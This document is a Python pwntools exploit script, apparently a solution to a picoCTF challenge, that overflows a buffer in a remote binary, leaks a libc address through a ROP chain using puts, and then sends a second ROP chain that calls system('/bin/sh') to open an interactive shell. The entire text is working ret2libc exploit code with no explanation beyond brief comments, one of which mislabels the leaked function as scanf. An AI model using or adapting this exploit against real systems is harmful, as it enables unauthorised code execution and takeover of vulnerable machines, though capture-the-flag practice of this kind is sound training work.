from pwn import *
# p = process("./vuln")
p = remote("mercury.picoctf.net",1774)
offset = 136

junk = b"A"*136
"""
0x0000000000400913 : pop rdi ; ret
"""
pop_rdi = 0x400913
setbuf_at_got = 0x601028
puts_at_plt = 0x400540
back_at_main_address = 0x400771

payload = [
        junk,
        # Call puts to leak memory address of `scanf` function
        p64(pop_rdi),
        p64(setbuf_at_got),
        p64(puts_at_plt),
        # puts need an argument, so we give it an address to jump to
        p64(back_at_main_address)
]
payload = b"".join(payload)
p.sendline(payload)

# banner: Welcome to my server \n
p.recvline()
# Echo output
p.recvline()
# scanf func leaked address
leaked_address = u64(p.recvline().strip().ljust(8, b"\x00")) # Add prefix to make it 8 bytes (suffix in Little Endian)
log.info(f"[+] Leaked: {hex(leaked_address)}")

setbuf_offset_in_libc = 0x88540
# libc address
base_libc_address = leaked_address - setbuf_offset_in_libc
log.info(f"[+] Libc address: {hex(base_libc_address)}")
# system func offset in libc
system_offset_in_libc = 0x4f4e0
system_address = base_libc_address + system_offset_in_libc

bin_sh_offset = 0x1b40fa
bin_sh_address = base_libc_address + bin_sh_offset
# Fix stack alignment
ret_instruction = 0x40052e

second_payload = [
    junk,
    p64(pop_rdi),
    p64(bin_sh_address),
    p64(ret_instruction),
    p64(system_address)
]
second_payload = b"".join(second_payload)

p.sendline(second_payload)
p.recvline()
p.interactive()